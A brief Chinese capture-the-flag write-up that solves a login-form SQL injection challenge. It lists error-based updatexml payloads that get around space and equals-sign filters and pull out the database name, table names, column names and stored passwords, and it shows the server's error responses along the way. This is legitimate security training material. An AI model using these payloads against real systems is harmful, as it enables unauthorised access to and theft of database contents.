空格被过滤 用括号绕过

报错注入相关的没有被过滤

```
?username=admin&password=1'or(updatexml(0,concat(0x5e,database()),0))%23
```

XPATH syntax error: '^geek'

=被过滤

```
?username=admin&password=1'or(updatexml(0,concat(0x5e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),0))%23
```

XPATH syntax error: '^H4rDsq1'

```
?username=admin&password=1'or(updatexml(0,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),0))%23
```

XPATH syntax error: '^id,username,password'

```
?username=admin&password=1'or(updatexml(1,concat(0x5e,(select(group_concat(password))from(geek.H4rDsq1)),0x5e),1))%23
```

XPATH syntax error: '^flag{46528c12-e3bd-408a-9bbf-b7'

加一个right((select语句), 30)

```
?username=admin&password=1'or(updatexml(1,concat(0x5e,right((select(group_concat(password))from(geek.H4rDsq1)),30),0x5e),1))%23
```

XPATH syntax error: '^2-e3bd-408a-9bbf-b702ee7598e9}^'

flag{46528c12-e3bd-408a-9bbf-b702ee7598e9}